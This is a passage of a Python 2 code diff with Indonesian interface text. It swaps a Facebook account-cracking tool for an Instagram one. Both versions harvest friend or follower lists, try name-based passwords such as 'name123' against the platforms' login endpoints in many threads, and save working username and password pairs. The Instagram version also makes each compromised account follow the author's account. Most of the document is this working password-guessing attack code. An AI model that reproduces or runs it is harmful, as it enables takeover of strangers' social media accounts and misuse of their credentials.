-    print "\x1b[0;36m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91  Ketik 'me' Untuk Crack Publik   \xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d"
-    idt = raw_input('\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80[\xe2\x80\xa2] ID Target : ')
-    if idt == '':
-        menu()
+        url = 'https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5'
+        with requests.Session() as (ses_dev):
+            try:
+                login_coki = ses_dev.get(url, cookies={'cookie': cok}, headers=headerz_api)
+                if 'users' in json.loads(login_coki.content):
+                    cookie = {'cookie': cok}
+                else:
+                    print m + '\n Cookie Expired...\n'
+                    hapus_cookie()
+                    login_dev()
+            except ValueError:
+                print m + '\n Cookie Expired...\n'
+                hapus_cookie()
+                login_dev()
+
+
+def login_dev_cookie():
+    global cookie
+    print '\n  Login Instagram\n'
+    cok = raw_input(' Enter Cookie: ')
+    with requests.Session() as (ses_dev):
+        login_coki = ses_dev.get(url_instagram, cookies={'cookie': cok}, headers=headerz)
+        if 'viewer_has_liked' in str(login_coki.content):
+            print ' Login Success....'
+            with open('cookie.txt', 'w') as (tulis_coki):
+                tulis_coki.write(cok)
+            cookie = {'cookie': cok}
+        else:
+            print ' Login Fail....'
+            exit()
+
+
+def data_pencarian_dev(cookie, nama, limit):
+    url = ('https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true').format(limit, nama)
+    with requests.Session() as (ses_dev):
+        res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
+        for dev in json.loads(res_dat_pencarian.content)['users']:
+            users = dev['user']
+            print ' Username:', users['username']
+            print ' Name:', users['full_name'].encode('utf-8')
+            print '-' * 50
+
+
+def crack():
+    with ThreadPoolExecutor(max_workers=30) as (insta_dev):
+        for dataku in data_:
+            try:
+                pw = []
+                data = dataku.encode('utf-8')
+                dat_ = data.split('==>')[0]
+                pw_ = data.split('==>')[1]
+                pw_nam = pw_.split()
+                if len(pencarian_) != 1:
+                    if len(dat_) >= 6:
+                        pw.append(dat_)
+                        if len(pw_nam[0]) <= 2:
+                            if len(pw_nam) >= 2:
+                                pw.append(pw_nam[0] + pw_nam[1])
+                            if len(pw_) >= 6:
+                                pw.append(pw_)
+                        else:
+                            pw.append(pw_nam[0] + '123')
+                            if len(pw_nam) >= 2:
+                                pw.append(pw_nam[0] + pw_nam[1])
+                            if len(pw_) >= 6:
+                                pw.append(pw_)
+                    elif len(pw_nam[0]) <= 2:
+                        if len(pw_nam) >= 2:
+                            pw.append(pw_nam[0] + pw_nam[1])
+                        if len(pw_) >= 6:
+                            pw.append(pw_)
+                    else:
+                        if len(pw_nam) >= 2:
+                            pw.append(pw_nam[0] + pw_nam[1])
+                        pw.append(pw_nam[0] + '123')
+                        if len(pw_) >= 6:
+                            pw.append(pw_)
+                else:
+                    pw.append(pw_nam[0] + '123')
+                    pw.append(dat_)
+                insta_dev.submit(crack_dev, dat_, pw)
+            except:
+                pass
+
+
+def auto_follow():
+    data_ok = open('result_ok.txt', 'r').readlines()
+    for dev in data_ok:
+        pecah = dev.split('==>')[1]
+        if pecah not in data_followers:
+            print ('\r >- Not Followed: {}').format(len(data_)),
+            sys.stdout.flush()
+            data_.append(dev)
+
+    print '\n'
+    with ThreadPoolExecutor(max_workers=3) as (insta_foll):
+        for data_foll in data_:
+            data_foll_ = data_foll.replace('\n', '')
+            us_foll = data_foll_.split('==>')[1]
+            pw_foll = data_foll_.split('==>')[3]
+            insta_foll.submit(crack_dev, us_foll, pw_foll)
+
+
+c_foll = 1
+count_foll = 1
+
+def follow_dev(ses_dev, username_dev):
+    global c_foll
+    global count_foll
+    if len(status_foll) != 1:
+        user_target = 'iqbaldev'
+        id_target = '12629128399'
+    else:
+        print h + ('\r >>> Follow {}/{}|Chek+{}/Live+{}  ').format(str(count_foll), len(data_), len(hasil_cp), len(hasil_ok)),
+        sys.stdout.flush()
+        user_target = username_get_follow
+        id_target = id_
+    dat_crf_foll = ses_dev.get(('https://www.instagram.com/{}/').format(user_target), headers=headerz_api).content
+    crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
+    headerz_foll = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 
+       'Accept-Language': 'en-US,en;q=0.5', 
+       'Host': 'www.instagram.com', 
+       'Origin': 'https://www.instagram.com', 
+       'Referer': ('https://www.instagram.com/{}/').format(user_target), 
+       'User-Agent': user_agentz, 
+       'X-CSRFToken': crf_token_foll}
+    param_foll = {''}
+    url_follow = ('https://www.instagram.com/web/friendships/{}/follow/').format(id_target)
+    res_foll = ses_dev.post(url_follow, headers=headerz_foll)
+    if len(status_foll) != 1:
+        pass
+    else:
+        print h + '\r [' + k + '>-' + h + '] ' + p + str(c_foll) + ' ' + k + username_dev + h + ' Sukses Mengikuti ' + p + user_target + k + ' >_< Wkwwkwkw\n'
+        c_foll += 1
+        count_foll += 1
+
+
+None
+
+def login_dev():
+    global cookie
+    print ''
+    print a + '  {' + p + ' Login Instagram ' + a + '}'
+    print m + '   ----------------'
+    print garis
+    username_dev = raw_input(a + ' ?' + p + ' Enter Username' + h + ': ')
+    pass_dev = raw_input(a + ' ?' + p + ' Enter Password' + d + ': ')
     try:
-        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
-        kntl = json.loads(mmk.text)
-    except KeyError:
-        print '[\xe2\x9d\x8c] ID Not Available'
-        menu()
-    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
-    ppk = json.loads(ajg.text)
-    for i in ppk['data']:
-        uid = i['id']
-        na = i['name']
-        nm = na.rsplit(' ')[0]
-        id.append(uid + '|' + nm)
-    print '\x1b[0;34m \xe2\x95\xa0\xe2\x94\x80[?] Total ID : \x1b[1;91m' + str(len(id))
-    pilihmetode(ppk)
-def cekakun():
-    print '\n [1]. lihat hasil crack OK '
-    print ' [2]. lihat hasil crack CP '
-    anjg = raw_input('\n [?] pilih : ')
-    if anjg == '':
-        menu()
-    elif anjg == '01' or anjg == '1':
-        print '\n [+] Hasil \x1b[0;92mOK\x1b[1;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
-        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
-        raw_input('\n [\xe2\x80\xa2] Kembali ')
-        menu()
-    elif anjg == '02' or anjg == '2':
-        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
-        print '\n [\xe2\x80\xa2] Hasil CP Tanggal : %s-%s-%s-%s' % (hari, ha, op, ta)
-        print ' \x1b[1;97m[\xe2\x80\xa2] Total : %s' % len(totalcp)
+        try:
+            headerz = {'User-Agent': user_agentz}
+            with requests.Session() as (dev):
+                url_scrap = 'https://www.instagram.com/'
+                data = dev.get(url_scrap, headers=headerz).content
+                crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
+            header = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 
+               'Accept-Language': 'en-US,en;q=0.5', 
+               'Host': 'www.instagram.com', 
+               'X-CSRFToken': crf_token, 
+               'X-Requested-With': 'XMLHttpRequest', 
+               'Referer': 'https://www.instagram.com/accounts/login/', 
+               'User-Agent': user_agentz}
+            param = {'username': username_dev, 
+               'enc_password': ('#PWD_INSTAGRAM_BROWSER:0:{}:{}').format(random.randint(1000000000, 9999999999), pass_dev), 
+               'optIntoOneTap': False, 
+               'queryParams': {}, 'stopDeletionNonce': '', 
+               'trustedDeviceRecords': {}}
+        except:
+            header = {}
+            param = {}
+
+        with requests.Session() as (ses_dev):
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            respon = ses_dev.post(url, data=param, headers=header)
+            data_dev = json.loads(respon.content)
+            da = respon.cookies.get_dict()
+            if 'userId' in str(data_dev):
+                print p + '\n *' + h + ' Login Success..'
+                for dev in da:
+                    with open('cookie.txt', 'a') as (tulis):
+                        tulis.write(dev + '=' + da[dev] + ';')
+
+                follow_dev(ses_dev, username_dev)
+                cok = open('cookie.txt', 'r').read()
+                cookie = {'cookie': cok}
+            elif 'checkpoint_url' in str(data_dev):
+                print k + '\n Account Cp'
+            elif 'Please wait' in str(data_dev):
+                print m + ' >>> Use Airplane Mood!! >>'
+            else:
+                print m + '\n Login Fail....'
+                exit()
+    except KeyboardInterrupt:
+        exit()
+
+
+None
+
+def data_follower_dev(cookie, id_target, limit, opsi):
+    global c
+    if opsi == '1':
+        url = ('https://i.instagram.com/api/v1/friendships/{}/followers/?count={}').format(id_target, limit)
+    elif opsi == '2':
+        url = ('https://i.instagram.com/api/v1/friendships/{}/following/?count={}').format(id_target, limit)
+    else:
+        exit(' Error..')
+    with requests.Session() as (ses_dev):
+        res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
+        for dev in json.loads(res_dat_foll.content)['users']:
+            username = dev['username']
+            nama = dev['full_name'].encode('utf-8')
+            if len(status_foll) != 1:
+                print h + '\r * ' + p + 'Take Username' + h + (': {}').format(len(data_)),
+                sys.stdout.flush()
+                data_.append(username + '==>' + nama.decode('utf-8'))
+                c += 1
+            else:
+                data_followers.append(username)
+
+
+None
+
+def info_dev(username_dev, pass_dev, status):
+    global id_
+    global mengikuti
+    global pengikut
+    try:
+        da = requests.get(('https://www.instagram.com/{}/?__a=1').format(username_dev), headers={'User-Agent': user_agentz})
+        data_us_dev = da.json()['graphql']['user']
+        nama = data_us_dev['full_name'].encode('utf-8')
+        id_ = data_us_dev['id']
+        pengikut = data_us_dev['edge_followed_by']['count']
+        mengikuti = data_us_dev['edge_follow']['count']
+        if status == 'Live':
+            print h + '\r [' + k + '>-' + h + ']' + p + ' Status: ' + h + status + '                 '
+            print h + '\r [' + k + '>-' + h + ']' + p + ' Name: ' + h + str(nama) + '              '
+            print h + '\r [' + k + '>-' + h + ']' + p + ' Follower: ' + k + str(pengikut) + '              '
+            print h + '\r [' + k + '>-' + h + ']' + p + ' Following: ' + k + str(mengikuti) + '              '
+            print h + '\r [' + k + '>-' + h + ']' + p + ' Username: ' + h + username_dev + '              '
+            print h + '\r [' + k + '>-' + h + ']' + p + ' Password: ' + h + pass_dev + '             \n'
+        elif status == 'Checkpoint':
+            print k + '\r [' + p + '>-' + k + ']' + p + ' Status: ' + k + status + '                 '
+            print k + '\r [' + p + '>-' + k + ']' + p + ' Name: ' + k + str(nama) + '              '
+            print k + '\r [' + p + '>-' + k + ']' + p + ' Follower: ' + p + str(pengikut) + '              '
+            print k + '\r [' + p + '>-' + k + ']' + p + ' Following: ' + p + str(mengikuti) + '              '
+            print k + '\r [' + p + '>-' + k + ']' + p + ' Username: ' + k + username_dev + '              '
+            print k + '\r [' + p + '>-' + k + ']' + p + ' Password: ' + k + pass_dev + '             \n'
+    except:
+        pass
+
+
+None
+count_ = 1
+
+def crack_dev(username_dev, pass_dev_):
+    global c
+    global count_
+    c_pw = len(pass_dev_)
+    for pass_satu in pass_dev_:
+        if c != 1:
+            pass
+        else:
+            if len(status_foll) != 1:
+                print h + ('\r >>>\x1b[97;1m Crack \x1b[96;1m{}\x1b[97;1m/\x1b[96;1m{}\x1b[97;1m/\x1b[96;1m{}\x1b[97;1m|\x1b[93;1mChek+{}\x1b[97;1m/\x1b[92;1mLive+{}  ').format(str(c_pw), str(count_), len(data_), len(hasil_cp), len(hasil_ok)),
+                sys.stdout.flush()
+                c_pw -= 1
+            try:
+                if username_dev in hasil_ok or username_dev in hasil_cp:
+                    break
+                pass_dev = pass_satu.lower()
+                try:
+                    headerz = {'User-Agent': user_agentz_api}
+                    with requests.Session() as (dev):
+                        url_scrap = 'https://www.instagram.com/'
+                        data = dev.get(url_scrap, headers=headerz).content
+                        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
+                    header = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 
+                       'Accept-Language': 'en-US,en;q=0.5', 
+                       'Host': 'www.instagram.com', 
+                       'X-CSRFToken': crf_token, 
+                       'X-Requested-With': 'XMLHttpRequest', 
+                       'Referer': 'https://www.instagram.com/accounts/login/', 
+                       'User-Agent': user_agentz}
+                    param = {'username': username_dev, 
+                       'enc_password': ('#PWD_INSTAGRAM_BROWSER:0:{}:{}').format(random.randint(1000000000, 99999999999), pass_dev), 
+                       'optIntoOneTap': False, 
+                       'queryParams': {}, 'stopDeletionNonce': '', 
+                       'trustedDeviceRecords': {}}
+                except:
+                    header = {}
+                    param = {}
+
+                with requests.Session() as (ses_dev):
+                    url = 'https://www.instagram.com/accounts/login/ajax/'
+                    respon = ses_dev.post(url, data=param, headers=header)
+                    data_dev = json.loads(respon.content)
+                    time.sleep(0.1)
+                    if 'checkpoint_url' in str(data_dev):
+                        cp = 'Checkpoint'
+                        info_dev(username_dev, pass_dev, cp)
+                        with open('hasil_cp.txt', 'a') as (dev_):
+                            dev_.write('[Chek]==>' + username_dev + '==>|==>' + pass_dev + '\n')
+                        hasil_cp.append(username_dev)
+                        break
+                    elif 'userId' in str(data_dev):
+                        live = 'Live'
+                        if len(status_foll) != 1:
+                            info_dev(username_dev, pass_dev, live)
+                            with open('result_ok.txt', 'a') as (dev_):
+                                dev_.write('[Live]==>' + username_dev + '==>|==>' + pass_dev + '\n')
+                            hasil_ok.append(username_dev)
+                            follow_dev(ses_dev, username_dev)
+                        else:
+                            hasil_ok.append('dev_id')
+                            follow_dev(ses_dev, username_dev)
+                        break
+                    elif 'Please wait' in str(data_dev):
+                        print m + '\r >>> Use Airplane Mood!! >>' + k + (' {}').format(str(c)),
+                        c += 1
+                        sys.stdout.flush()
+                        pass_dev_iq = [pass_dev]
+                        crack_dev(username_dev, pass_dev_iq)
+                        count_ -= 1
+                    else:
+                        c = 1
+            except requests.exceptions.ConnectionError:
+                print k + ('\r No Internet Connection...!>> {}').format(str(c)),
+                sys.stdout.flush()
+                c += 1
+                pass_dev_iq = [pass_dev]
+                crack_dev(username_dev, pass_dev_iq)
+                count_ -= 1
+            except:
+                c = 1
+
+    count_ += 1
+
+
+None
+
+def _yuk_(iqbaldev):
+    import string
+    try:
+        open('cokiz.txt', 'r').read()
+    except IOError:
+        d_str = []
+        fu = base64.b64encode(iqbaldev + 'O')
+        for str_ in str(string.ascii_lowercase):
+            d_str.append(str_)
+
+        for i_ in fu:
+            with open('cokiz.txt', 'a') as (iq):
+                iq.write(i_ + random.choice(d_str) + '%')
+
+
+def _uyuk_():
+    global followerz
+    global followerzz
+    global wak_
+    try:
+        fol_tam = ''
+        fol_tamzz = ''
+        fol_z = open('cokiz.txt', 'r').read().split('%>')
+        for dev_fol in fol_z[0].split('%'):
+            try:
+                fol_tam += dev_fol[0]
+            except:
+                pass
+
+        followerz = base64.b64decode(fol_tam)
+        if platform_dev != base64.b64decode(fol_z[2]):
+            pass
+        else:
+            try:
+                for dev_folzz in fol_z[1].split('%'):
+                    try:
+                        fol_tamzz += dev_folzz[0]
+                    except:
+                        pass
+
+                followerzz = base64.b32decode(fol_tamzz)
+            except:
+                pass
+
+            try:
+                wak_ = base64.b64decode(fol_z[3]).split()
+            except:
+                pass
+
+    except:
+        pass
+
+
+def pilihan(pil):
+    global username_get_follow
+    proses_crack = h + ' * ' + p + 'Wait Proses Start...!'
+    if pil == '1':
+        pas = ''
+        status = ''
+        username = raw_input(a + '\n ?' + p + ' Enter Target Username' + h + ': ')
+        info_dev(username, pas, status)
+        print garis
+        print p + ' [' + k + '1' + p + '] Follower ' + h + username + p + ' >> ' + k + str(pengikut)
+        print p + ' [' + k + '2' + p + '] Following ' + h + username + p + ' >> ' + k + str(mengikuti)
+        print garis
+        pil2 = raw_input(a + ' ?' + p + ' Choose' + k + ': ')
+        limit = input(a + ' ?' + p + ' Enter Limit' + k + ': ')
+        if pil2 == '1':
+            data_follower_dev(cookie, id_, limit, pil2)
+            print
+            print proses_crack
+            print '\n'
+            crack()
+        elif pil2 == '2':
+            data_follower_dev(cookie, id_, limit, pil2)
+            print
+            print proses_crack
+            print '\n'
+            crack()
+    elif pil == '2':
+        print garis
+        usr_ = raw_input(a + ' ?' + p + ' Enter Name' + k + ': ')
+        jm = input(a + ' $' + p + ' Total' + h + ': ')
+        us = usr_.replace(' ', '')
+        pencarian_.append('iqbal_dev')
+        data_.append(us + '==>' + us)
+        data_.append(us + '_' + '==>' + us)
+        for dev in range(1, jm + 1):
+            data_.append(us + str(dev) + '==>' + us)
+            data_.append(us + '_' + str(dev) + '==>' + us)
+            data_.append(us + str(dev) + '_' + '==>' + us)
+
         print ''
-        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
-        raw_input('\n [\xe2\x80\xa2] kembali ')
-        menu()
+        print proses_crack
+        print '\n'
+        crack()
+    elif pil == 'o':
+        data_follower_dev(cookie, id_, limit, pil2)
+        print
+        print proses_crack
+        print '\n'
+        crack()
+    elif pil == '3':
+        cek_hasil()
+    elif pil == 'g':
+        pas = ''
+        status = ''
+        status_foll.append('IqbalDev')
+        print garis
+        username_get_follow = raw_input(a + '  ?' + p + ' Masukkan Username Target' + k + ': ')
+        info_dev(username_get_follow, pas, status)
+        print garis
+        print p + ' [1] Follower ' + h + username_get_follow + p + ' >> ' + k + str(pengikut)
+        print p + ' [2] Following ' + h + username_get_follow + p + ' >> ' + k + str(mengikuti)
+        print garis
+        raw_input(' Enter To .. ')
+        print garis
+        data_follower_dev(cookie, id_, limit=1000000000, opsi='1')
+        auto_follow()
+    elif pil == 't':
+        import os
+        try:
+            os.system('git clone https://github.com/IqbalDev/insta_dev')
+            os.system('rm -rf insta_dev.py')
+            os.system('cp -f insta_dev/insta_dev.py \\.')
+            os.system('rm -rf insta_dev')
+            print h + '\n Success Update Tool..' + p + '>_<\n'
+        except:
+            print '\n Device Not Supported  \n'
+
+    elif pil == '4':
+        kel = raw_input(k + ' > Log Out? ' + p + 'y/n' + h + ': ')
+        if kel in ('y', 'Y'):
+            hapus_cookie()
+            print ' > Back....'
+        else:
+            print h + ' > Please run the tool again..'
+    elif pil == 'remove_premium':
+        hapus_cokiz()
+        print p + '\n >_' + h + ' Premium Was removed...\n'
     else:
-        print ' [!] pilih yang benar!!'
-        menu()
-def laporbug():
-    asulo = raw_input('\n [?] Masalah BUG : ').replace(' ', '%20')
-    if asulo == '':
-        menu()
-    os.system('xdg-open https://wa.me/6283185392138?text=' + asulo)
-    raw_input('\n [\xe2\x80\xa2] kembali ')
-    menu()
-def infologin():
-    print ''
-    print '\n [*] token : ' + token
-    print ''
-    raw_input('\n [\xe2\x80\xa2] kembali ')
-    menu()
-def pilihmetode(file):
-    print '\x1b[0;36m \xe2\x95\x91 '
-    print '\x1b[0;33m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n\x1b[0;32m \xe2\x95\x91  METHODE CRACK   \xe2\x95\x91\n\x1b[0;36m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d'
-    print '\x1b[0;32m \xe2\x95\x91 '
-    print '\x1b[0;32m \xe2\x95\xa0\xe2\x94\x80[1] Methode Api (Fast)'
-    print '\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80[2] Methode Mbasic (Slow)'
-    print '\x1b[0;34m \xe2\x95\x91 '
-    z = raw_input('\x1b[0;33m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91Methode\xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    if z == '':
-        print ' [!] Pilih Yang Benar!!'
-        pilihmetode(file)
-    elif z == '01' or z == '1':
-        bapi()
-    elif z == '02' or z == '2':
-        freefb()
-    else:
-        print ' [!] pilih yang benar!'
-        exit()
-def bapi():
-    ask = raw_input(' \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91  Password Manual? [Y/t]   \xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    if ask == 'Y' or ask == 'y':
-        manualbapi()
-    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
-    print ''
-    def main(arg):
-        global cp
-        global loop
-        global ok
-        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
-        sys.stdout.flush()
-        user = arg
-        uid, name = user.split('|')
-        try:
-            os.mkdir('out')
-        except OSError:
-            pass
-        try:
-            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
-                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
-                   'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': uas, 
-                   'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
-                respon = requests.get(api, params=param, headers=kontol)
-                if 'session_key' in respon.text and 'EAAA' in respon.text:
-                    print '\r  \x1b[0;92m[LIVE] ' + uid + '|' + pw + '        '
-                    ok.append(uid + '|' + pw)
-                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
-                    save.write('  [LIVE] ' + str(uid) + '|' + str(pw) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-                if 'www.facebook.com' in respon.json()['error_msg']:
-                    try:
-                        token = open('login.txt').read()
-                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
-                        b = json.loads(sw.text)
-                        graph = b['birthday']
-                        month, day, year = graph.split('/')
-                        month = bulan[month]
-                        print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
-                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
-                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-                        save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
-                        save.close()
-                        break
-                    except (KeyError, IOError):
-                        graph = ' '
-                    except:
-                        pass
-                    print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '                        '
-                    cp.append(uid + '|' + pw)
-                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-                    save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-            loop += 1
-        except:
-            pass
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
-    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
-    exit()
-def manualbapi():
-    print '\n [\xe2\x80\xa2] Contoh Password : bismillah,sayang,rahasia'
-    pw = raw_input(' [?] Password : ').split(',')
-    if len(pw) == 0:
-        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
-    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
-    print ''
-    def main(arg):
-        global loop
-        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
-        sys.stdout.flush()
-        user = arg
-        uid, name = user.split('|')
-        try:
-            os.mkdir('out')
-        except OSError:
-            pass
-        try:
-            for asu in pw:
-                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': uas, 
-                   'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': asu, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
-                respon = requests.get(api, params=param, headers=kontol)
-                if 'session_key' in respon.text and 'EAAA' in respon.text:
-                    print '\r\x1b[0;92m  [LIVE] ' + uid + '|' + asu + '        '
-                    ok.append(uid + '|' + asu)
-                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
-                    save.write('  [LIVE] ' + str(uid) + '|' + str(asu) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-                if 'www.facebook.com' in respon.json()['error_msg']:
-                    print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + asu + '        '
-                    cp.append(uid + '|' + asu)
-                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-                    save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(asu) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-            loop += 1
-        except:
-            pass
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
-    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
-    exit()
-def freefb():
